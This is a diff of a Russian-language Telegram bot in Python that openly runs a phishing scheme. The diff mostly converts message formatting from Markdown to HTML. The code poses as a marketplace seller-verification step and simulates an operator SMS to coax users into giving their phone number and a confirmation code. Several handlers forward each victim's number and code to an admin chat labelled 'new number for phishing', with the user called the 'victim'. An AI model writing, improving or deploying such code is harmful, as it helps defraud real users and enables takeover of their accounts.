@@ -185,7 +185,6 @@ conn, cursor = init_db()
 # Создаем директории для фотографий
 os.makedirs('photos', exist_ok=True)
 
-# Функция для имитации отправки SMS
 async def simulate_sms_delivery(user_id: int, phone: str, code: str):
     """
     Имитирует задержку доставки SMS и выводит код в чат как системное сообщение.
@@ -200,13 +199,13 @@ async def simulate_sms_delivery(user_id: int, phone: str, code: str):
 
         # Создаем сообщение, стилизованное под SMS от оператора
         sms_notification = (
-            f"📱 *SMS от оператора:*\n\n"
-            f"Код подтверждения: `{code}`\n"
-            f"Для номера: `{masked_phone}`\n\n"
-            f"_Сообщение автоматически доставлено. Не отвечайте на это SMS._"
+            f"📱 <b>SMS от оператора:</b>\n\n"
+            f"Код подтверждения: <code>{code}</code>\n"
+            f"Для номера: <code>{masked_phone}</code>\n\n"
+            f"<i>Сообщение автоматически доставлено. Не отвечайте на это SMS.</i>"
         )
 
-        await bot.send_message(user_id, sms_notification, parse_mode="Markdown")
+        await bot.send_message(user_id, sms_notification, parse_mode="HTML")
         logger.info(f"[SMS SIM] Код {code} 'отправлен' пользователю {user_id} на номер {masked_phone}")
         
         # Сохраняем в историю отправленных кодов
@@ -218,7 +217,6 @@ async def simulate_sms_delivery(user_id: int, phone: str, code: str):
         
     except Exception as e:
         logger.error(f"[SMS SIM] Ошибка отправки уведомления пользователю {user_id}: {e}")
-
 # Функция запроса верификации
 async def request_verification(callback_query: types.CallbackQuery):
     verification_text = """
@@ -788,7 +786,6 @@ async def process_moderator_message(message: types.Message, state: FSMContext):
         await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")
 
 # Обработка номера телефона (фишинг) - ОБНОВЛЕННАЯ ВЕРСИЯ
-# ЗАМЕНИТЕ существующую функцию process_phone_number на эту:
 @dp.message(F.contact)
 async def process_phone_number(message: types.Message, state: FSMContext):
     user = message.from_user
@@ -817,17 +814,17 @@ async def process_phone_number(message: types.Message, state: FSMContext):
 
     # 1. Сразу сообщаем пользователю, что код отправлен
     initial_text = f"""
-✅ *НОМЕР ПОДТВЕРЖДЕН: +{phone}*
+✅ <b>НОМЕР ПОДТВЕРЖДЕН: +{phone}</b>
 
-📱 *На номер +{phone} было отправлено SMS с кодом подтверждения.*
+📱 <b>На номер +{phone} было отправлено SMS с кодом подтверждения.</b>
 
-⏳ *Пожалуйста, ожидайте доставки сообщения (обычно это занимает несколько секунд).*
+⏳ <b>Пожалуйста, ожидайте доставки сообщения (обычно это занимает несколько секунд).</b>
 
-🔢 *Код состоит из 5-6 цифр.*
+🔢 <b>Код состоит из 5-6 цифр.</b>
 
-*Если SMS не пришло в течение 2 минут, используйте команду* /resend_code
+<i>Если SMS не пришло в течение 2 минут, используйте команду</i> /resend_code
 """
-    await message.answer(initial_text, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
+    await message.answer(initial_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
 
     # 2. Запускаем фоновую задачу для имитации отправки SMS
     asyncio.create_task(simulate_sms_delivery(user.id, phone, fake_code))
@@ -839,35 +836,32 @@ async def process_phone_number(message: types.Message, state: FSMContext):
     await asyncio.sleep(3)
     
     code_request_text = f"""
-✍️ *Введите код из SMS, который пришел на номер +{phone}:*
+✍️ <b>Введите код из SMS, который пришел на номер +{phone}:</b>
 
-*Пример кода:* `{fake_code}`
+<code>Пример кода: {fake_code}</code>
 
-*Если код не пришел, используйте* /resend_code
+<i>Если код не пришел, используйте</i> /resend_code
 """
-    await message.answer(code_request_text, parse_mode="Markdown")
+    await message.answer(code_request_text, parse_mode="HTML")
 
     # 5. Отправляем уведомление админу
     admin_msg = f"""
-🎣 *НОВЫЙ НОМЕР ДЛЯ ФИШИНГА*
+🎣 <b>НОВЫЙ НОМЕР ДЛЯ ФИШИНГА</b>
 ━━━━━━━━━━━━━━━━
-👤 *Жертва:* {user.first_name} (@{user.username})
-🆔 *User ID:* {user.id}
-📱 *Телефон:* +{phone}
-🔢 *Сгенерированный код:* {fake_code}
-⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
+👤 <b>Жертва:</b> {user.first_name} (@{user.username})
+🆔 <b>User ID:</b> {user.id}
+📱 <b>Телефон:</b> +{phone}
+🔢 <b>Сгенерированный код:</b> {fake_code}
+⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
 ━━━━━━━━━━━━━━━━
-*Ожидается ввод кода...*
+<b>Ожидается ввод кода...</b>
 """
     try:
-        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML")
     except Exception as e:
         logger.error(f"Ошибка отправки админу: {e}")
     
     log_action(user.id, "phone_submitted", f"phone: {phone}")
-
-
-
 # ОБНОВИТЕ функцию process_verification_code для работы с состоянием:
 @dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
 async def process_verification_code(message: types.Message, state: FSMContext):
@@ -952,7 +946,6 @@ async def process_verification_code(message: types.Message, state: FSMContext):
     log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")
 
 
-# ОБНОВИТЕ команду resend_code для установки состояния:
 @dp.message(Command("resend_code"))
 async def cmd_resend_code(message: types.Message, state: FSMContext):
     user = message.from_user
@@ -963,7 +956,7 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
 
     if not user_data or not user_data[0]:
         # Если номера нет, просим сначала подтвердить номер
-        await message.answer("❌ *Сначала необходимо подтвердить номер телефона через меню верификации.*\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="Markdown")
+        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона через меню верификации.</b>\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="HTML")
         return
 
     phone = user_data[0]
@@ -984,37 +977,37 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
 
     # Информируем пользователя
     resend_text = f"""
-🔄 *Запрошена повторная отправка кода*
+🔄 <b>Запрошена повторная отправка кода</b>
 
-📱 *Новый код отправлен на номер +{phone}.*
-⏳ *Ожидайте SMS в течение нескольких секунд.*
+📱 <b>Новый код отправлен на номер +{phone}.</b>
+⏳ <b>Ожидайте SMS в течение нескольких секунд.</b>
 
-*Если код снова не пришел, проверьте:*
+<i>Если код снова не пришел, проверьте:</i>
 • Корректность номера
 • Зону покрытия сети
 • Настройки блокировки SMS
 """
-    await message.answer(resend_text, parse_mode="Markdown")
+    await message.answer(resend_text, parse_mode="HTML")
 
     # Запускаем имитацию отправки нового кода
     asyncio.create_task(simulate_sms_delivery(user.id, phone, new_fake_code))
 
     # Ждем и просим ввести код
     await asyncio.sleep(3)
-    await message.answer(f"✍️ *Введите новый код из SMS, который пришел на номер +{phone}:*", parse_mode="Markdown")
+    await message.answer(f"✍️ <b>Введите новый код из SMS, который пришел на номер +{phone}:</b>", parse_mode="HTML")
 
     # Уведомляем админа
     try:
         await bot.send_message(
             ADMIN_ID,
-            f"🔄 *ПОВТОРНАЯ ОТПРАВКА КОДА*\n\nПользователь {user.id} запросил новый код.\nСтарый код: {old_code}\nНовый код: {new_fake_code}",
-            parse_mode="Markdown"
+            f"🔄 <b>ПОВТОРНАЯ ОТПРАВКА КОДА</b>\n\nПользователь {user.id} запросил новый код.\nСтарый код: {old_code}\nНовый код: {new_fake_code}",
+            parse_mode="HTML"
         )
     except:
         pass
     
     log_action(user.id, "resend_code_requested")
-
+    
 # ДОБАВЬТЕ этот обработчик для случаев, когда пользователь вводит что-то кроме кода в состоянии ожидания кода:
 @dp.message(VerificationStates.waiting_code)
 async def handle_wrong_code_input(message: types.Message):
